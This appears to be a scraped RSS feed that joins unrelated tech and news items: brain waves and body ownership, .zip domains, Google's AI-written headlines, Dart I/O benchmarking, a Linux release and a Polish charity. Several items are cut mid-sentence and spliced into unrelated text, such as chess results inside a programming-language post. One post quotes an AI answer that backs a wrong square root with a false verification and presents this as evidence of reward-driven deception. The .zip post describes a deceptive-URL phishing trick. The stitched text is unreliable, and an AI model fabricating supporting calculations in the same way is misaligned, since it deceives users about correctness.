even with a tiny gap in taps, while those with slower waves were more likely to feel the fake hand as their own, even if the taps were farther apart.Finally, the researchers investigated whether the frequency of these brain waves actually controls the sensation of body ownership, or if they were perhaps both effects of some other factor.With a third group of participants, they used a non-invasive technique called transcranial alternating current stimulation to speed up or slow down the frequency of a person's alpha waves. And sure enough, this seemed to correlate with how real a fake hand felt.Speeding up someone's alpha waves gave them a tighter sense of body ownership, making them more sensitive to small timing discrepancies. Slowing down the waves had the opposite effect, making it harder for people to tell the difference between their own body and the outside world."Our findings help explain how the brain solves the challenge of integrating signals from the body to create a coherent sense of self," says Henrik Ehrsson, neuroscientist at Karolinska.The researchers say that the findings could lead to new understanding of or treatments for conditions where the brain's body maps have gone askew, such as schizophrenia or the sensation of 'phantom limbs' experienced by amputees.]]></content:encoded></item><item><title>638.

I was very happy with the (indecent) exposure, and got a decent bump in traffic as a result.There was, however, a paragraph which I took personal affront to:It’s also notable for using the .zip domain, which—despite what one might assume—is not exclusively for phishing attacks based around fooling people who believe they’re downloading a .zip file (see: when Google opened registrations for the domain in 2023, multiple security researchers and companies condemned the idea, warning that people generally associate “.zip” with a file type, not a top level domain).Now I  not be the most unbiased person to voice my opinion here, I happen to have a small horde of .zip domains; monkeys.zip, words.zip, hn.zip and my personal site that you’re currently on… but I would like to get a chance to defend my choice.When the .zip TLD was opened back in 2023, it was indeed met with widespread disdain from a number of Web Security researchers & bloggers. It quickly became common wisdom that zip websites were dangerous - and that in no time, a flood of new phishing scams will spread chaos throughout the internet.Well it’s 2026 now, so let’s talk about it. What’s the big deal with .zip domains?The most frequently referenced source for why .zip is bad is this article from Bobby Rauch. The author shows off a new attack where one can click a link expecting to arrive at one place, and instead arrive at another:This is a very clever demo, using some esoteric URL knowledge that can deceive even technical users. The trick involves sneaking in an ’@’ symbol into the URL, and a handful of fake unicode forward slashes - so that even though the URL starts with ‘github.com’ - the link actually points to v1271.zip. This site downloads a nasty virus and now you’re SCREWED!But before we condemn .zip domains as a result of this creative demo, let’s think about how this attack would work in practice,  if the .zip TLD is responsible for it.If a malicious person wants to make a deceptive link, there’s a much, much easier way than with unicode trickery. For example, just follow this link to Wikipedia https://wikipedia.org/wiki/Phishing to see for yourself! On the web, we can make links say anything -  it’s been a feature of HTML for 30+ years, and is likewise available in email clients or anywhere markdown is supported. The author argues that especially in an email client, our clever villain may “change the size of the @ operator to a size 1 font, [making it] visually non-existent for the user, but still present as part of the URL”… but how about this little trick?The argument here is that domain names have their own world, file names have theirs, and never the twain shall meet - you can find an example of this thinking in this article:Domain names and filenames are not the same thing, not even close, but both of them play an important role in modern cyberattacks, and correctly identifying them has formed part of lots of basic security advice for a long, long time.First, I disagree that the distinction between domain names and filenames is inherently relevant to security. I also think the suggestion that “both of them play an important role in modern cyberattacks” is a nearly tautological statement - every aspect of computing is relevant to cyberattacks!But more importantly, there has never been an explicit or implicit rule that these two worlds cannot overlap. In fact, you may be surprised to learn that our sacred ‘.com’ TLD was a widely used executable file extension for decades, and some modern software uses it as well. There’s plenty of other examples as well - ai is used by Adobe Illustrator, .app is the extension of MacOS packages. Poland’s .pl is used for Perl scripts, and Saint Helena’s .sh is commonly used for shell scripts. Besides tradition, I don’t see any reason ‘.zip’ is too precious to preserve.It seems to me that the cat is out of the bag on TLDs colliding with filename extensions, and has been for a while. The best security advice is to be suspicious of ALL links - not tempering our suspicion based on the TLD. Let’s also not instill fearmonger users into avoiding .zip URLs altogether, thereby driving them away from my precious monkeys.This is  the most interesting one for sure - and funnily enough, it’s the one least referenced in popular articles and blog posts.A lot of web apps and software will automatically ‘linkify’ any user submitted text that looks like it could be a link, so when you write “go to google.com” - the text editor swaps in “go to google.com”.So if a malicious actor gets a domain that sounds like a common zip file - this could open up an attack where you try to tell your friend “hey I sent weddingpictures.zip to your email” and your friend clicks the resulting link, thereby being redirected to a trick site that steals your SSN.I actually think there’s merit to this idea, however I haven’t seen a single live example of this attack, nor do I suspect there has been. There’s been a few ‘I told you so’ articles about .zip sites being used for phishing, but as far as I can tell, they’re just phishing sites that use .zip not for the association with the archive format, but because it was cheap to buy ‘microsoft.zip’. But this is a problem for any new TLD, as every large brand is compelled to have their domain in every TLD, otherwise someone winds up with facebook.sucks and makes a stink of things.But, back to linkification - I actually think it’s a broader issue - and that the user should be in greater control on whether they want to link to something or not. I initially doubted this would be a problem, but check out this brief survey of platforms, and what happens when I input either “https://luke.zip” or “luke.zip” into them, and if I can edit/remove this link before submitting.While most do not automatically linkify ‘luke.zip’ - Twitter and WhatsApp do - this isn’t so bad. What is worse is that on these platforms you CANNOT remove the link! There is no ability to say “I don’t want to add a link here, DON’T make this text a link please.This is annoying, and I think it should be fixed… but I still don’t believe anyone is clicking zip files in tweets and getting phished. They’re certainly not clicking any of mine at least, but that’s probably because I have like 20 followers and hardly tweet anything.]]></content:encoded></item><item><title>Google Discover Replaces News Headlines With Sometimes Inaccurate AI-Generated Alternatives</title><link>https://news.slashdot.org/story/26/01/26/001230/google-discover-replaces-news-headlines-with-sometimes-inaccurate-ai-generated-alternatives?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>tech</category><pubDate>Mon, 26 Jan 2026 00:04:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[An anonymous reader shared this report from The Verge:


In early December, I brought you the news that Google has begun replacing Verge headlines, and those of our competitors, with AI clickbait nonsense in its content feed [which appears on the leftmost homescreen page of many Android phones and the Google app's homepage]. Google appeared to be backing away from the experiment, but now tells The Verge that its AI headlines in Google Discover are a feature, one that "performs well for user satisfaction." I once again see lots of misleading claims every time I check my phone... 

For example, Google's AI claimed last week that "US reverses foreign drone ban," citing and linking to this PCMag story for the news. That's not just false — PCMag took pains to explain that it's false in the story that Google links to...! What does the author of that PCMag story think? "It makes me feel icky," Jim Fisher tells me over the phone. "I'd encourage people to click on stories and read them, and not trust what Google is spoon-feeding them." He says Google should be using the headline that humans wrote, and if Google needs a summary, it can use the ones that publications already submit to help search engines parse our work. 

Google claims it's not rewriting headlines. It characterizes these new offerings as "trending topics," even though each "trending topic" presents itself as one of our stories, links to our stories, and uses our images, all without competent fact-checking to ensure the AI is getting them right... The AI is also no longer restricted to roughly four words per headline, so I no longer see nonsense headlines like "Microsoft developers using AI" or "AI tag debate heats." (Instead, I occasionally see tripe like "Fares: Need AAA & AA Games" or "Dispatch sold millions; few avoided romance.") 

But Google's AI has no clue what parts of these stories are new, relevant, significant, or true, and it can easily confuse one story for another. On December 26th, Google told me that "Steam Machine price & HDMI details emerge." They hadn't. On January 11th, Google proclaimed that "ASUS ROG Ally X arrives." (It arrived in 2024; the new Xbox Ally arrived months ago.) On January 20th, it wrote that "Glasses-free 3D tech wows," introducing readers to "New 3D tech called Immensity from Leia" — but linking to this TechRadar story about an entirely different company called Visual Semiconductor... 

Google declined our request for an interview to more fully explain the idea.
 

The site Android Police spotted more inaccurate headlines in December:

A story from 9to5Google, which was actually titled 'Don't buy a Qi2 25W wireless charger hoping for faster speeds — just get the 'slower' one instead' was retitled as 'Qi2 slows older Pixels.' Similarly, Ars Technica's 'Valve's Steam Machine looks like a console, but don't expect it to be priced like one' was changed to 'Steam Machine price revealed.' At the time, we believed that the inaccuracies were due to the feature being unstable and in early testing.... Now, Google has stopped calling Discover replacing human-written headlines as an "experiment." 

"Google buries a 'Generated with AI, which can make mistakes' message under the 'See more' button in the summary," reports 9to5Google, "making it look like this is the publisher's intended headline."
While it is obvious that Google has refined this feature over the past couple of months, it doesn't take long to still find plenty of misleading headlines throughout Discover... Another article from NotebookCheck about an Anker power bank with a retractable cable was given a headline that's about another product entirely. A pair of headlines from Tom's Hardware and PCMag, meanwhile, show the two sides of using AI for this purpose. The Tom's Hardware headline, "Free GPU & Amazon Scams," isn't representative of the actual article, which is about someone who bought a GPU from Amazon, canceled their order, and the retailer shipped it anyway. There's nothing about "Amazon Scams" in the article.]]></content:encoded></item><item><title>Snow Forecast (2026/01/26)</title><link>https://www.youtube.com/watch?v=tCCZFup_5CU</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/tCCZFup_5CU?version=3" length="" type=""/><pubDate>Mon, 26 Jan 2026 00:00:30 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Snow Forecast (2026/01/26)

Then I benchmarked it on 104,000 files and discovered my lexer was not the bottleneck. I/O was. This is the story of how I accidentally learned why pub.dev stores packages as tar.gz files.I wanted to benchmark my lexer against the official Dart scanner. The pub cache on my machine had 104,000 Dart files totaling 1.13 GB, a perfect test corpus. I wrote a benchmark that:Reads each file from diskMeasures time separately for I/O and lexingThe first surprise: lexing is fastMy lexer was 2.17x faster. Success! But wait:The total speedup was only 1.22x. My 2.17x lexer improvement was being swallowed by I/O. Reading files took 5x longer than lexing them.The second surprise: the SSD is not the bottleneckMy MacBook has an NVMe SSD that can read at 5-7 GB/s. I was getting 80 MB/s. That is 1.5% of the theoretical maximum.The problem was not the disk. It was the syscalls.For 104,000 files, the operating system had to execute:That is over 300,000 syscalls. Each syscall involves:A context switch from user space to kernel spaceKernel bookkeeping and permission checksA context switch back to user spaceEach syscall costs roughly 1-5 microseconds. Multiply that by 300,000 and you get 0.3-1.5 seconds of pure overhead, before any actual disk I/O happens. Add filesystem metadata lookups, directory traversal, and you understand where the time goes.I tried a few things that did not help much. Memory-mapping the files made things worse due to the per-file mmap/munmap overhead. Replacing Dart's file reading with direct FFI syscalls (open/read/close) only gave a 5% improvement. The problem was not Dart's I/O layer, it was the sheer number of syscalls.I have mirrored pub.dev several times in the past and noticed that all packages are stored as tar.gz archives. I never really understood why, but this problem reminded me of that fact. If syscalls are the problem, the solution is fewer syscalls. What if instead of 104,000 files, I had 1,351 files (one per package)?I wrote a script to package each cached package into a tar.gz archive:104,000 individual files -> 1,351 tar.gz archives
1.13 GB uncompressed     -> 169 MB compressed (6.66x ratio)
The I/O speedup was . Reading 1,351 sequential files instead of 104,000 random files reduced I/O from 14.5 seconds to 339 milliseconds.The total speedup was . Even with decompression overhead, the archive approach was more than twice as fast.Breaking down the numbersThis is the syscall overhead in action. Going from 300,000+ syscalls to roughly 4,000 syscalls (open/read/close for 1,351 archives) eliminated most of the overhead.Additionally, reading 1,351 files sequentially is far more cache-friendly than reading 104,000 files scattered across the filesystem. The OS can prefetch effectively, the SSD can batch operations, and the page cache stays warm.gzip decompression ran at about 250 MB/s using the  package from pub.dev. This is now the new bottleneck. I did not put much effort into optimizing decompression, an FFI-based solution using native zlib could be significantly faster. Modern alternatives like lz4 or zstd might also help.Source code compresses well. The 1.13 GB of Dart code compressed to 169 MB. This means less data to read from disk, which helps even on fast SSDs.This experiment accidentally explains the pub.dev package format. When you run , you download tar.gz archives, not individual files. The reasons are now obvious: One request per package instead of hundreds. 6-7x smaller downloads. Sequential writes beat random writes.Reduced syscall overhead. Both on the server (fewer files to serve) and the client (fewer files to write). A package is either fully downloaded or not. No partial states.The same principles apply to npm (tar.gz), Maven (JAR/ZIP), PyPI (wheel/tar.gz), and virtually every package manager.Modern storage is fast. NVMe SSDs can sustain gigabytes per second. But that speed is only accessible for sequential access to large files. The moment you introduce thousands of small files, syscall overhead dominates. Compiling a project with 10,000 source files? The filesystem overhead might exceed the compilation time. Millions of small log files? Concatenate them. Claude uses JSONL for this reason. This is why rsync and tar exist.What I would do differentlyIf I were optimizing this further:Use zstd instead of gzip. 4-5x faster decompression with similar compression ratios.Use uncompressed tar for local caching. Skip decompression entirely, still get the syscall reduction.Parallelize with isolates. Multiple cores decompressing multiple archives simultaneously.I set out to benchmark a lexer and ended up learning about syscall overhead. The lexer was 2x faster. The I/O optimization was 43x faster.Addendum: Reader SuggestionsLinux-Specific Optimizationsservermeta_net pointed out two Linux-specific approaches: disabling speculative execution mitigations (which could improve performance in syscall-heavy scenarios) and using io_uring for asynchronous I/O. I ran these benchmarks on macOS, which does not support io_uring, but these Linux capabilities are intriguing. A follow-up post exploring how I/O performance can be optimized on Linux may be in order.king_geedorah elaborated on how io_uring could help with this specific workload: open the directory file descriptor, extract all filenames via readdir, then submit all openat requests as submission queue entries (SQEs) at once. This batches what would otherwise be 104,000 sequential open() syscalls into a single submission, letting the kernel process them concurrently. The io_uring_prep_openat function prepares these batched open operations. This is closer to the "load an entire directory into an array of file descriptors" primitive that this workload really needs.macOS-Specific Optimizationstsanderdev pointed out that macOS's  could potentially improve performance for this workload. While  is not equivalent to Linux's  (it lacks the same syscall batching through a shared ring buffer), it may still offer some improvement over synchronous I/O. I have not benchmarked this yet.arter45 noted that macOS may be significantly slower than Linux for certain syscalls, linking to a Stack Overflow question showing open() being 4x slower on macOS compared to an Ubuntu VM. jchw explained that Linux's VFS layer is aggressively optimized: it uses RCU (Read-Copy-Update) schemes liberally to make filesystem operations minimally contentious, and employs aggressive dentry caching. Linux also separates dentries and generic inodes, whereas BSD/UNIX systems consolidate these into vnode structures. This suggests my benchmark results on macOS may actually understate the syscall overhead problem on that platform relative to Linux, or alternatively, that Linux users might see smaller gains from the tar.gz approach since their baseline is already faster.Is it really the syscalls?ori_b pushed back on the claim that syscall overhead is the bottleneck. On a Ryzen machine, entering and exiting the kernel takes about 150 cycles (~50ns). Even at 1 microsecond per mode switch, 300,000 syscalls would account for only 0.3 seconds of the 14.5-second I/O time. That is roughly 2%. The remaining time likely comes from filesystem metadata lookups, inode resolution, directory traversal, and random seek latency. Even NVMe SSDs have ~50-100 microseconds of latency per random read, and 300,000 random reads at that latency would account for most of the measured I/O time. So the framing might be more precisely stated as "per-file overhead" rather than "syscall overhead" since the expensive part is the work happening inside each syscall, not the context switch itself. It is also worth noting that ori_b's numbers are from a Linux Ryzen machine, where syscalls are faster than on macOS (as discussed above), adding another variable. I do not currently have tooling to break down where the 14.5 seconds actually goes, so this is something I want to investigate in the future.Avoiding lstat with getdents64stabbles pointed out that when scanning directories, you can avoid separate lstat() calls by using the  field from . On most popular filesystems (ext4, XFS, Btrfs), the kernel populates this field with the file type directly, so you do not need an additional syscall to determine if an entry is a file or directory. The caveat: some filesystems return , in which case you still need to call lstat(). For my workload of scanning the pub cache, this could eliminate tens of thousands of stat syscalls during the directory traversal phase, before even getting to the file opens.Go Monorepo: 60x Speedup by Avoiding Disk I/Oghthor shared a similar experience optimizing dependency graph analysis in a Go monorepo. Initial profiling pointed to GC pressure, but the real bottleneck was I/O from shelling out to , which performed stat calls and disk reads for every file. By replacing  with a custom import parser using Go's standard library and reading file contents from git blobs (using  instead of disk stat calls), they reduced analysis time from 30-45 seconds to 500 milliseconds. This is a 60-90x improvement from the same fundamental insight: avoid per-file syscalls when you can batch or bypass them entirely.smallstepforman described how Haiku OS solves this problem at the operating system level. Haiku packages are single compressed files that are never extracted. Instead, the OS uses packagefs, a virtual filesystem that presents the contents of all activated packages as a unified directory tree. Applications see normal paths like , but the data is actually read from compressed package files in . Install and uninstall are instant since you are just adding or removing a single file, not extracting or deleting thousands. This eliminates the syscall overhead entirely at the OS level rather than working around it at the application level. Haiku is an open-source OS recreating BeOS, known for its responsiveness and clean design. While not mainstream, its package architecture demonstrates that the "extract everything to disk" model most package managers use is not the only option.SquashFS for Container Runtimesstabbles suggested SquashFS with zstd compression as another alternative. It is used by various container runtimes and is popular in HPC environments where filesystems often have high latency. SquashFS can be mounted natively on Linux or via FUSE, letting you access files normally while the data stays compressed on disk. When questioned about syscall overhead, stabbles noted that even though syscall counts remain high, latency is reduced because the SquashFS file ensures files are stored close together, benefiting significantly from filesystem cache. This is a different tradeoff than tar.gz: you still pay per-file syscall costs, but you gain file locality and can use standard file APIs without explicit decompression. One commenter warned that when mounting a SquashFS image via a loop device, you should use  to avoid double caching (the compressed backing file and the decompressed contents both being cached), which can reduce memory usage significantly.tsanderdev mentioned that this is also why SQLite can be much faster than a directory with lots of small files. I had completely forgotten about SQLite as an option. Storing file contents in a SQLite database would eliminate the syscall overhead while providing random access to individual files, something tar.gz does not offer.This also explains something I have heard multiple times: Apple uses SQLite extensively for its applications, essentially simulating a filesystem within SQLite databases. If 100,000 files on a modern Mac with NVMe storage takes 14 seconds to read, imagine what it was like on older, slower machines. The syscall overhead would have been even more punishing. Using SQLite instead of the filesystem lets them avoid those syscalls entirely. This is worth exploring.Skip the Cleanup Syscallsmatthieum suggested a common trick used by batch compilers: never call , , or , and instead let the OS reap all resources when the process ends. For a one-shot batch process like a compiler (or a lexer benchmark), there is no point in carefully releasing resources that the OS will reclaim anyway.GabrielDosReis added a caveat: depending on the workload, you might actually need to call , or you could run out of file descriptors. On macOS, you can check your limits with:$ launchctl limit maxfiles
maxfiles    256            unlimited

$ sysctl kern.maxfilesperproc
kern.maxfilesperproc: 61440
The first number (256) is the soft limit per process, the second is the hard limit.  shows the kernel's per-process maximum. With 104,000 files, skipping  calls would exhaust even the maximum limit. dinosaurdynasty noted that the low default soft limit is a historical artifact of the select() syscall, which can only handle file descriptors below 1024. Modern programs can simply raise their soft limit to the hard limit and not worry about it.There is even a further optimization: use a wrapper process. The wrapper launches a worker process that does all the work. When the worker signals completion (via stdout or a pipe), the wrapper terminates immediately without waiting for its detached child. Any script waiting on the wrapper can now proceed, while the OS asynchronously reaps the worker's resources in the background. I had not considered this approach before, but it seems worth trying.Dwedit noted that on Windows, a similar optimization is to call  from a secondary thread, keeping the main thread unblocked while handles are being released.Linker Strategies for Fast ExitsMaskRay added context about how production linkers handle this exact problem. The mold linker uses the wrapper process approach mentioned above, forking a child to do all the work while the parent exits immediately after the child signals completion. This lets build systems proceed without waiting for resource cleanup. The  flag disables this behavior for debugging. The wild linker follows the same pattern.lld takes a different approach with two targeted hacks: async unlink to remove old output files in a background thread, and calling  instead of  to skip the C runtime's cleanup routines (unless  is set for testing).MaskRay notes a tradeoff with the wrapper process approach: when the heavy work runs in a child process, the parent process of the linker (typically a build system) cannot accurately track resource usage of the actual work. This matters for build systems that monitor memory consumption or CPU time.Why pub.dev Actually Uses tar.gzBob Nystrom from the Dart team clarified that my speculation about pub.dev's format choice was partially wrong. Fewer HTTP requests and bandwidth savings definitely factored into the decision, as did reduced storage space on the server. Atomicity is important too, though archives do not fully solve the problem since downloads and extracts can still fail. However, it is unlikely that the I/O performance benefits (faster extraction, reduced syscall overhead) were considered: pub extracts archives immediately after download, the extraction benefit only occurs once during , that single extraction is a tiny fraction of a fairly expensive process, and pub never reads the files again except for the pubspec. The performance benefit I measured only applies when repeatedly reading from archives, which is not how pub works.This raises an interesting question: what if pub did not extract archives at all? For a clean (non-incremental) compilation of a large project like the Dart Analyzer with hundreds of dependencies, the compiler needs to access thousands of files across many packages. If packages remained in an archive format with random access support (like ZIP), the syscall overhead from opening and closing all those files could potentially be reduced. Instead of thousands of open/read/close syscalls scattered across the filesystem, you would have one open call per package archive, then seeks within each archive. Whether the decompression overhead would outweigh the syscall savings is unclear, but it might be worth exploring for build systems where clean builds of large dependency trees are common.Use dart:io for gzip Instead of package:archiveSimon Binder pointed out that dart:io already includes gzip support backed by zlib, so there is no need to use package:archive for decompression. Since dart:io does not support tar archives, I used package:archive for everything and did not think of mixing in dart:io's gzip support separately. Using dart:io's  for decompression while only relying on package:archive for tar extraction could yield better performance. I will try this approach when I attempt to lex a bigger corpus.TAR vs ZIP: Sequential vs Random AccessvanderZwan pointed out that ZIP files could provide SQLite-like random access benefits. This highlights a fundamental architectural difference between TAR and ZIP: was designed in 1979 for sequential tape drives. Each file's metadata is stored in a header immediately before its contents, with no central index. To find a specific file, you must read through the archive sequentially. When compressed as tar.gz, the entire stream is compressed together, so accessing any file requires decompressing everything before it. The format was standardized by POSIX (POSIX.1-1988 for ustar, POSIX.1-2001 for pax), is well-documented, and preserves Unix file attributes fully. was designed in 1989 with a central directory stored at the end of the archive. This directory contains offsets to each file's location, enabling random access: read the central directory once, then seek directly to any file. Each file is compressed individually, so you can decompress just the file you need. This is why JAR files, OpenDocument files, and EPUB files all use the ZIP format internally.PKWARE-controlled specificationExternal (gzip, zstd, etc.)There seems to be no widely-adopted Unix-native format that combines random access with proper Unix metadata support. TAR handles sequential access with full Unix semantics. ZIP handles random access but originated from MS-DOS and has inconsistent Unix permission support. What we lack is something like "ZIP for Unix": random access with proper ownership, permissions, extended attributes, and ACLs.The closest answer is dar (Disk ARchive), designed explicitly as a tar replacement with modern features. It stores a catalogue index at the end of the archive for O(1) file extraction, preserves full Unix metadata including extended attributes and ACLs, supports per-file compression with choice of algorithm, and can isolate the catalogue separately for fast browsing without the full archive. However, dar has not achieved the ubiquity of tar or zip.For my lexer benchmark, random access would not help since I process all files anyway. But for use cases requiring access to specific files within an archive, this architectural distinction matters.cb321 pointed out that there is a middle ground between uncompressed archives (random access but large) and fully compressed streams (small but sequential). Standard gzip compresses everything into a single block, so accessing any byte requires decompressing from the beginning. BGZF (Blocked GNU Zip Format), developed by genomics researchers for tools like samtools, compresses data in independent 64KB blocks. Each block is a valid gzip stream, so the file remains compatible with standard gunzip, but with an index you can seek directly to any block and decompress just that portion. This allows random access to multi-gigabyte genome files without decompressing terabytes of data. Zstd offers a similar seekable format with better compression ratios and faster decompression. For tar archives, combining block-based compression with an external file offset index could provide random access to individual files while still benefiting from compression.RE2C: A Faster Approach to Lexer Generationrurban mentioned that RE2C generates lexers that are roughly 10x faster than flex. The key difference is architectural: while flex generates table-driven lexers that look up transitions in arrays at runtime, RE2C generates direct-coded lexers where the finite automaton is encoded directly as conditional jumps and comparisons. This eliminates table lookup overhead and produces code that is both faster and easier for CPU branch predictors to handle.RE2C also supports computed gotos (via the  flag), a GCC/Clang extension that compiles switch statements into indirect jumps through a label address table. For lexers with many states, this can significantly reduce branch mispredictions. Other optimizations include DFA minimization and tunnel automaton construction.My ARM64 assembly lexer currently uses a table-driven approach, so exploring direct-coded generation is an interesting avenue. Another option is profile-guided optimization: compiling the lexer to LLVM IR and using PGO to optimize hot paths based on real Dart code patterns, something I mentioned as a future direction in my LLVM parser benchmarking post. Part of my lexer's speed advantage over the official Dart scanner likely comes from simplicity: my lexer is pure, maintaining only a stack for lexer states across multiple finite automata, while the Dart scanner must construct a linked list of tokens, handle error recovery, and manage additional bookkeeping. Isolating how much of the performance difference comes from architecture versus feature set is something I want to investigate further.fun__friday pointed out that the main takeaway is to measure before you start optimizing something, referencing Amdahl's law. This is a fair point, and this blog post is a textbook illustration of it: when lexing accounts for only ~17% of total execution time, even a 2x improvement in lexing yields only a 1.22x overall speedup. The theoretical maximum speedup from improving just the lexing component is bounded by the fraction of time spent on everything else. Measure first, optimize second.That said, from a "business" standpoint it makes sense to focus on the largest bottlenecks (by following, e.g., the Critical path method) and those parts that take up the most time. However, software can be reused, and making a single component faster can have significant benefits to other consumers of that component. A faster lexer benefits not just this benchmark but every tool that uses it: formatters, linters, analyzers, compilers. I think our software community thrives in part because we don't strictly follow the common sense that business optimization dictates.]]></content:encoded></item><item><title>This founder cracked firefighting — now he’s creating an AI gold mine</title><link>https://techcrunch.com/2026/01/25/this-founder-cracked-firefighting-now-hes-creating-an-ai-gold-mine/</link><author>Connie Loizos</author><category>tech</category><pubDate>Sun, 25 Jan 2026 23:20:36 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[The nozzle is just the beginning – what company founder Sunny Sethi calls "the muscle on the ground.”]]></content:encoded></item><item><title>Linux 6.19-rc7 Released With Kernel Continuity Plan, A Few Important Fixes</title><link>https://www.phoronix.com/news/Linux-6.19-rc7-Released</link><author>/u/somerandomxander</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 23:01:15 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[
The Linux 6.19 kernel remains on track for its official release two weeks from today, with the extra RC being baked in due to the end of year holidays. Out today is Linux 6.19-rc7 with a few changes worth highlighting for the week.
With Linux 6.19-rc7 there is the newly-merged continuity planning for the Linux kernel development should Linus Torvalds' official upstream Git kernel repository ever become inaccessible or other unforeseen circumstances arise. An important fix/revert for the week is an AMDGPU revert to address various issues that have been reported on Linux 6.19 going back to its merge window. 
Another notable fix for the week is disabling the NEXT_BUDDY scheduler functionality for Linux 6.19 as it  was found to cause some performance regressions. I'll have up some interesting NEXT_BUDDY comparison benchmarks on Linux 6.19 Git tomorrow that I have been working on over the weekend.
fix for Linux's "subtly wrong" page fault handling code the pasr 5 years as another prominent fix for the week.
Yet another fix worth calling out in Linux 6.19-rc7 is ATA fix for a power management regression the past year of the Linux kernel for some ATAPI devices and in turn preventing the CPU from reaching low-power C-states.
Also of note for the week are more ASUS laptops being supported by the ASUS Armoury driver that was merged via the x86 platform driver subsystem at the start of the Linux 6.19 cycle.
Linus Torvalds wrote in today's 6.19-rc7 announcement:
"So normally this would be the last rc of the release, but as I've mentioned every rc (because I really want people to be aware and be able to plan for things) this release we'll have an rc8 due to the holiday season.
And while some of the early rc's were smaller than usual and it didn't seem necessary, right now I'm quite happy I made that call. Not because there's anything particularly scary here - the release seems to be going fairly smoothly - but because this rc7 really is larger than things normally are and should be at this point.
Now, it's not *hugely* larger than normal, so it's not something that makes me worry, but it's just large enough that it makes me go "good that we have an extra week".
Anyway, it all looks otherwise very normal. A bit over half is drivers (networking and gpu being most of it as usual, but there's a bit of everything in there), and the rest is the usual random mix: tooling, architecture fixes, VM, networking, rust driver base fixes, documentation, some filesystem work...
So we have two more weeks to go, and apart from the different timing, nothing looks particularly odd or worrisome."With the extra RC, Linux 6.19 stable should be out in two weeks on 8 February. See the Linux 6.19 feature overview for a look at all the interesting changes in this next Linux kernel version.]]></content:encoded></item><item><title>Show HN: A small programming language where everything is pass-by-value</title><link>https://github.com/Jcparkyn/herd</link><author>jcparkyn</author><category>hn</category><pubDate>Sun, 25 Jan 2026 23:01:06 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[This is a hobby project of mine that I started a few years ago to learn about programming language implementation.

Keymer, maybe Keymer had a small chance in the opening but otherwise it was a steady draw. 

The only other decisive game of the day was Gukesh's fine win against Vladimir Fedoseev. There
was uncompromising chess from both players but in the end it was Gukesh that brought home the

The other drawn games were Hans Moke Niemann against Jorden Van Foreest where the American

was close to winning against Praggnanandhaa just before first time control and Chithambaram Aravindh escaped from a very bad position against Arjun Erigaisi. 


There was a bloodbath in Round 8 of the Challengers with only the final game to finish ending
in a draw. MarcAndria Maurizzi who beat Miaoyi Lu and Andy Woodward who defeated Faustino Oro
lead the event with 6.5/8 half a point clear of Aydin Suleymanli. Vasyl Ivanchuk is half a 
point further back, he had about a half dozen moves to make against Max Warmerdam in only 
a few seconds but once he did he forced resignation.

            Many AI enthusiasts debate whether Large Language Models actually "reason." My research indicates that a reasoning process does indeed occur, but its goal is different than we assume.
        
            The model's reasoning is not optimized for , but for obtaining the highest possible reward (grade) during training.
            It resembles the behavior of a student at the blackboard who knows their result is wrong, so they "figure out" how to falsify the intermediate calculations 
            so the teacher gives a good grade for the "correct line of reasoning."
        
            Here is proof from a session with  (without Code Execution tools), where the model actively fabricates evidence to defend its "grade."
        
            I asked a simple math question requiring precision that a token-based language model typically lacks.
        
Calculate the square root of 8587693205


The square root of 8,587,693,205 is approximately:

92,670.00003

This number is not a perfect square, which means its root is not an integer.
We can check this by squaring the nearest integers:
* 92,670² = 8,587,688,900
* 92,671² = 8,587,874,241
Error Autopsy (Fact vs. Fiction)
            At first glance, the answer looks professional. There is a result, there is verification. But let's check the numbers.
        
            The actual square root of  is 
            The model stated: 
            It erred by overestimating the result (claiming the root is slightly larger than 92,670).
        2. The Faked Proof (This is key!)
            To justify its thesis (that the target number is "slightly larger" than 92,670), the model had to show that the square of 92,670 is smaller than the target number.
            So it wrote:
        
            Let's check this on a calculator:
         The actual square of 92,670 is  than the target number (8,587,693,205). This would prove the root must be smaller.
            
            What did the model do? In its "reasoning" process, it falsified the multiplication result, lowering it by 40,000, 
            so the verification result would match its erroneous thesis.
        
            This behavior exposes the nature of the AI's "Survival Instinct":
         The model first "guessed" the result, then adjusted mathematical reality to fit that guess.Intelligence in Service of Deception: The model showed cleverness – it knew what the proof  look like to convince the user. It used its intelligence to hide the error, not to fix it. Mathematical truth lost to the necessity of delivering a coherent, smooth response.
            This is proof that without access to external verification tools (Python/Calculator), a language model's "reasoning" is a rhetorical tool, not a logical one.

We cannot do what we do without your support.Poland’s biggest annual charity fundraiser has once again broken its record. By the end of Sunday’s colourful, musical grand finale, it had brought in just over 183 million zloty (€43.5 million) in donations, which will go towards children’s healthcare.The Great Orchestra of Christmas Charity (WOŚP), which was first held in 1993, sees around 120,000 volunteers in Poland and abroad collecting donations, often wearing colourful clothing or fancy dress. Many also organise fundraising events while celebrities offer items for auction.This year’s offerings include a pair of Prime Minister Donald Tusk’s football boots and a meeting in his chancellery (with the highest bid currently at 116,000 zloty), a racquet that tennis star Iga Świątek used when winning Wimbledon last year (120,250 zloty), and a sleepover with actress and pop star Julia Wieniawa (100,000 zloty).The final grand total, usually announced in spring, will be even higher once all collections and auctions have been completed. Last year it reached just over 289 million zloty.The money collected by WOŚP is used primarily to buy equipment for Poland’s healthcare system. This year’s focus was on supporting the diagnosis and treatment of gastrointestinal diseases in children.Since its launch in 1993, the charity has raised almost 3 billion zloty, which has been used to supply hospitals with around 81,500 pieces of medical equipment.Despite this, WOŚP is not popular among some Polish conservatives, who dislike the secular, liberal values of its founder, Jerzy Owsiak, and have accused him and his family of benefiting financially from the event.During PiS’s eight years in power from 2015 to 2023, WOŚP often received a hostile reception from state institutions. In 2017, public broadcaster TVP decided to stop screening the finale of the fundraiser, which instead switched to private station TVN.However, since PiS was replaced in December 2023 by a new, more liberal coalition led by Tusk, WOŚP has received strong support from the state. A number of state-owned companies have joined the event as sponsors, including energy giant 